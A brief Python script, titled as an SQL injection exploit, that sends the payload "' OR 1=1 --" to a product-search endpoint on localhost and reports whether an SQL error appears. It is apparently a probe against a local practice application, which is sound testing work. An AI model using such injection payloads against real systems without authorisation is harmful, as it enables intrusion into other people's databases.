# SQL Injection Exploit

import requests

target_url = "http://localhost:3000/rest/products/search?q="
payload = "' OR 1=1 --"

response = requests.get(target_url + payload)

if "SQL syntax" in response.text or response.status_code == 500:
    print("[+] SQL Injection vulnerability found!")
else:
    print("[-] No SQL Injection vulnerability detected.")
